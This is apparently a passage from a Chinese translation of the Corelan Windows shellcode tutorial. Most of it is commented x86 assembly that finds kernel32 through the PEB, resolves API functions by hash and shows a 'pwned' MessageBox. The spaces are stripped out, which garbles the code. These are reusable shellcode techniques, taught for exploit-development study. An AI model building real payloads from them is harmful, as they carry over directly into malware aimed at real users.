;intoal,+incrementesi
testal, al ;bitwisetest:
;seeifendofstringhasbeenreached
jz compute_hash_finished ;ifzeroflagisset=endofstringreached
roredi, 0xd ;ifzeroflagisnotset,rotatecurrent
;valueofhash13bitstotheright
addedi, eax ;addcurrentcharacterofsymbolname
;tohashaccumulator
jmpcompute_hash_again ;continueloop
compute_hash_finished:
find_function_compare:
cmp edi, [esp + 0x28] ;see if computed hash matches requested hash (at
esp+0x28)
;edi=currentcomputedhash
;esi=currentfunctionname(string)
jnzfind_function_loop ;nomatch,gotonextsymbol
movebx, [edx + 0x24] ;ifmatch:extractordinalstable
;relativeoffsetandputinebx
addebx, ebp ;addbaseaddress.
;ebx=absoluteaddressofordinalsaddresstable
movcx, [ebx + 2 * ecx] ;getcurrentsymbolordinalnumber(2bytes)
movebx, [edx + 0x1c] ;getaddresstablerelativeandputinebx
addebx, ebp ;addbaseaddress.
;ebx=absoluteaddressofaddresstable
moveax, [ebx + 4 * ecx] ;get relative functionoffsetfrom its ordinaland putin
eax
addeax, ebp ;addbaseaddress.
;eax=absoluteaddressoffunctionaddress
mov[esp + 0x1c], eax ;overwritestackcopyofeaxsopopad
;willreturnfunctionaddressineax
find_function_finished:
popad ;retrieveoriginalregisters.
;eaxwillcontainfunctionaddress
ret
;=======Function : loop to lookup functions for a given dll (process all
hashes)============
find_funcs_for_dll:
lodsd ;loadcurrenthashintoeax(pointedtobyesi)
pusheax ;pushhashtostack
pushedx ;pushbaseaddressofdlltostack
callfind_function
mov[edi],eax ;writefunctionpointerintoaddressatedi
addesp,0x08
addedi,0x04 ;increaseeditostorenextpointer
cmpesi,ecx ;didweprocessallhashesyet?
jnefind_funcs_for_dll ;getnexthashandlookupfunctionpointer
find_funcs_for_dll_finished:
Ret
;=======Function:GetpointertoMessageBoxTitle============
GetTitle: ;Definelabelforlocationofwinexecargumentstring
callTitleReturn ;callreturnlabelsothereturnaddress
;(locationofstring)ispushedontostack
db"Corelan" ;Writetherawbytesintotheshellcode
db0x00 ;Terminateourstringwithanullcharacter.
;=======Function:GetpointertoMessageBoxText============
GetText: ;Definelabelforlocationofmsgboxargumentstring
callTextReturn ;callreturnlabelsothereturnaddress
;(locationofstring)ispushedontostack
db"YouhavebeenpwnedbyCorelan";Writetherawbytesintotheshellcode
db0x00 ;Terminateourstringwithanullcharacter.
;=======Function:Getpointertouser32.dlltext============
GetUser32: ;Definelabelforlocationofuser32.dllstring
callUser32Return ;callreturnlabelsothereturnaddress
;(locationofstring)ispushedontostack
db"user32.dll" ;Writetherawbytesintotheshellcode
db0x00 ;Terminateourstringwithanullcharacter.
;=======Function:Getpointerstofunctionhashes============
GetHashes:
callGetHashesReturn
;LoadLibraryA hash:0x8E4E0EEC
db0x8E
db0x4E
db0x0E
db0xEC
;ExitProcess hash=0x7ED8E273
db0x7E
db0xD8
db0xE2
db0x73
GetMsgBoxHash:
callGetMsgBoxHashReturn
;MessageBoxA hash=0xA8A24DBC
db0xA8
db0xA2
db0x4D
db0xBC
;===================================================================
=
;===================MAINAPPLICATION===============================
;===================================================================
=
start_main:
subesp,0x08 ;allocatespaceonstacktostore2things:
;inthisorder:ptrtoLoadLibraryA,ExitProc
movebp,esp ;setebpasframeptrforrelativeoffset
;sowewillbeabletodothis:
;callebp+4 =ExecuteLoadLibraryA
;callebp+8 =ExecuteExitProcess
callfind_kernel32
movedx,eax ;savebaseaddressofkernel32inedx
;locate functionsinsidekernel32first
jmpGetHashes ;getaddressoffirsthash
GetHashesReturn:
popesi ;getpointertohashintoesi
leaedi,[ebp+0x4] ;wewillstorethefunctionaddressesatedi
;(ediwillbeincreasedwith0x04foreachhash)
;(seeresolve_symbols_for_dll)
movecx,esi
addecx,0x08 ;storeaddressoflasthashintoecx
callfind_funcs_for_dll ;getfunctionpointersforthe2
;kernel32functionhashes
;andputthematebp+4andebp+8
;locatefunctioninuser32.dll
;loadlibraryfirst-sofirstputpointertostringuser32.dlltostack
jmpGetUser32
User32Return:
;pointerto"user32.dll"isnowontopofstack,sojustcallLoadLibrary
call[ebp+0x4]
;thebaseaddressofuser32.dllisnowineax(ifloadedcorrectly)
;putitinedxsoitcanbeusedinfind_function
movedx,eax
;findtheMessageBoxAfunction
;firstgetpointertofunctionhash
jmpGetMsgBoxHash
GetMsgBoxHashReturn :
;putpointerinesiandpreparetolookupfunction
popesi
lodsd ;loadcurrenthashintoeax(pointedtobyesi)
pusheax ;pushhashtostack
pushedx ;pushbaseaddressofdlltostack
callfind_function
;functionaddressshouldbeineaxnow
;we'llkeepitthere
jmpGetTitle ;jumptothelocation
;oftheMsgBoxTitlestring
TitleReturn: ;Definealabeltocallsothat
;stringaddressispushedonstack
popebx ;ebxnowpointstoTitlestring
jmpGetText ;jumptothelocation
;oftheMsgBoxTextstring
TextReturn: ;Definealabeltocallsothat
;stringaddressispushedonstack
popecx ;ecxnowpointstoTextstring
;nowpushparameterstothestack
xoredx,edx ;zerooutedx
pushedx ;put0onstack
pushebx ;putpointertoTitleonstack
pushecx ;putpointertoTextonstack
pushedx ;put0onstack
calleax ;callMessageBoxA(0,Text,Title,0)
;ExitFunc
xoreax,eax
;zeroouteax
pusheax ;put0onstack
call[ebp+8] ;ExitProcess(0)
（超过290字节，并且包括38个null字节！）
让我们试下w32-testival：
你可以用这些技术打造更多的强大的shellcode-或者只是玩一下并且将这个例子扩展一点点
-像这样：
;SampleshellcodethatwillpopaMessageBox
;withcustomtitleandtextand"OK"+"Cancel"button
;andbasedonthebuttonyouclick,somethingelse
;willbeperformed
;WrittenbyPeterVanEeckhoutte
;http://www.corelan.be:8800
[Section.text]
[BITS32]
global_start
_start:
jmpstart_main
;===========FUNCTIONS=============
;=======Function:GetKernel32baseaddress============
;Technique:PEBInMemoryOrderModuleList
find_kernel32:
xoreax,eax ;clearebx
moveax,[fs:0x30] ;getapointertothePEB
moveax,[eax+0x0C] ;getPEB->Ldr
moveax,[eax+0x14] ;getPEB->Ldr.InMemoryOrderModuleList.Flink(1stentry)
moveax,[eax] ;getthenextentry(2ndentry)
moveax,[eax] ;getthenextentry(3rdentry)
moveax,[eax+0x10] ;getthe3rdentriesbaseaddress(kernel32.dll)
Ret
;=======Function:Findfunctionbaseaddress============
find_function:
pushad ;saveallregisters
movebp, [esp + 0x24] ;putbaseaddressofmodulethatisbeing
;loadedinebp
moveax, [ebp + 0x3c] ;skipoverMSDOSheader
movedx, [ebp + eax + 0x78];gotoexporttableandputrelativeaddress
;inedx
addedx, ebp ;addbaseaddresstoit.
;edx=absoluteaddressofexporttable
movecx, [edx + 0x18] ;setupcounterECX
;(howmanyexporteditemsareinarray?)
movebx, [edx + 0x20] ;putnamestablerelativeoffsetinebx
addebx, ebp ;addbaseaddresstoit.